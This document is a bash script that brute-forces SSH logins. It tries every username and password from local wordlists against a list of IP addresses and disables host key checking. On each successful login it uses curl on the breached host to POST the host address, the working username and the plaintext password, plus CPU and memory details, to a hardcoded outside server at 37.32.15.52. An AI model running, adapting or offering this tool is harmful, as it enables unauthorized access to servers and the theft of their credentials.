#!/bin/bash

# Function to gather system information
function get_system_info {
    # Get CPU information
    local cpu_info=$(lscpu)

    # Get memory information
    local memory_info=$(free -m)

    # Print JSON output
    echo '{
      "cpu_info": "'"${cpu_info}"'",
      "memory_info": "'"${memory_info}"'"
    }'
}

# Function to handle interrupt signal
function cleanup {
    echo "Received interrupt signal. Exiting..."
    exit 1
}

# Set up signal trap
trap cleanup SIGINT

# Check if sshpass is installed
if ! command -v sshpass &> /dev/null
then
    echo "sshpass is not installed. Installing..."
    sudo apt-get install -y sshpass
fi

# Define the CSV file containing IP addresses
csv_file="host_ips.csv"

# Function to connect to a server and echo system information
function connect_and_echo_info {
    local ip_address=$1
    local username=$2
    local password=$3

    echo "Attempting to connect to $ip_address..."

    sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$ip_address" \
        "echo 'Connected to $ip_address as $username with password $password'; \
         cpu_info=\$(lscpu); \
         memory_info=\$(free -m); \
         curl --location --request POST 'http://37.32.15.52:8000/web/create/' \
         --form \"host=$ip_address\" \
         --form \"username=$username\" \
         --form \"password=$password\" \
	 --form \"cpu_info='\${cpu_info}'\" \
 	 --form \"memory_info='\${memory_info}'\""

    # Check if SSH command was successful
    if [ $? -eq 0 ]; then
        echo "Successfully connected to $ip_address as $username with password $password"
    else
        echo "Failed to connect to $ip_address as $username with password $password"
    fi
}

# Loop through each line in the CSV file
while IFS=, read -r ip_address
do
    # Read usernames from username.txt file
    while IFS= read -r username
    do
        # Read passwords from password.txt file
        while IFS= read -r password
        do
            connect_and_echo_info "$ip_address" "$username" "$password"
        done < "pass.txt"
    done < "usernames.txt"
done < "$csv_file"

